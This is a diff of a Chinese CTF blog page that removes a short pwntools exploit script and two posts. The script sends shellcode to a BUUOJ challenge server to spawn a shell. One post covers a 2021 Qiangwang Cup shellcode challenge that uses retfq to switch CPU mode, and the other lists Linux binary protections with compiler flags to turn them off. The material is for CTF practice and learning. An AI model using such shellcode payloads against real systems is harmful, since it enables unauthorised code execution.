-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26268</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;plz:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00B\x00&#x27;</span>+asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h4 id="2021强网杯-shellcode"><a href="#2021强网杯-shellcode" class="headerlink" title="2021强网杯-shellcode"></a>2021强网杯-shellcode</h4><p>在这里我们要先知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的<code>retfq</code>汇编指令来修改</p>
-<p>retfq有两步操作，<code>ret</code>以及<code>set cs</code>，所以执行retfq会跳转到rsp同时将cs设置为[rsp+0x8]，我们只需要事先在ret位置写入32位的shellcode就可以执行了，但是这里有一点需要注意的是，retfq跳转过去的时候程序已经切换成了32位模式，所以地址解析也是以32位的规则来的，所以原先的<code>rsp = 0x7ffe530d01b8</code>会被解析成<code>esp = 0x530d01b8</code></p>
-<p>因为call的是rbx，所以rbx中存储着shellcode执行的起始地址，将rbx pop 给rax，就可以用rax+偏移来得到push rdx;pop rdx;指令的地址，进而进行异或处理（其实不是很懂为什么不直接用rbx做基址）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">Linux保护技术</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-17 16:17:49" itemprop="dateCreated datePublished" datetime="2021-12-17T16:17:49+08:00">2021-12-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-21 01:03:57" itemprop="dateModified" datetime="2022-01-21T01:03:57+08:00">2022-01-21</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h3><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>将数据（堆、栈）所在内存页标识为不可执行，当程序尝试在数据页面上执行指令时，CPU会抛出异常而不是去执行指令。</p>
-<h5 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-z execstack</code></p>
-<p>开启：<code>-z noexecstack</code></p>
-<h3 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h3><h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>使程序每次加载的基址随机化</p>
-<h5 id="编译选项-1"><a href="#编译选项-1" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-no-pie</code></p>
-<p>开启：<code>-pie-fPIC</code></p>
-<h3 id="Canary保护"><a href="#Canary保护" class="headerlink" title="Canary保护"></a>Canary保护</h3><h5 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h5><p>函数开始执行时往栈上插入Canary值，并在函数返回的时候检查Canary的值是否有变动，如果有则调用 <code>__stack_check_fail</code> 函数强行停止程序。</p>
-<h5 id="编译选项-2"><a href="#编译选项-2" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-fno-stack-protector</code></p>
-<p>部分启用（只为局部变量中含有 char 的函数插入Canary）：<code>-fstack-protector</code></p>
-<p>全局启用（为所有函数插入Canary）：<code>-fstack-protector-all</code></p>
-<h3 id="Fortify保护"><a href="#Fortify保护" class="headerlink" title="Fortify保护"></a>Fortify保护</h3><h5 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h5><p>主要用来防止格式化字符串漏洞。包含 <code>%n</code> 的格式化字符串不能位于程序内存中的可写地址。当使用位置参数时，必须使用范围内的所有参数（例如要使用 <code>%7$x</code> ，则必须同时使用 1$，2$，3$……）</p>
-<h5 id="编译选项-3"><a href="#编译选项-3" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-D_FORTIFY_SOURCE = 0</code></p>
-<p>开启：<code>-D_FORTIFY_SOURCE = 2</code></p>
-<h3 id="RELRO保护"><a href="#RELRO保护" class="headerlink" title="RELRO保护"></a>RELRO保护</h3><h5 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h5><p>设置符号重定向表为<strong>只读</strong>并在程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击</p>
-<h5 id="编译选项-4"><a href="#编译选项-4" class="headerlink" title="编译选项"></a>编译选项</h5><p>开启（部分）：<code>-z lazy</code></p>
-<p>开启（完全）：<code>-z now</code></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1311,14 +1265,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">42</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">27</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
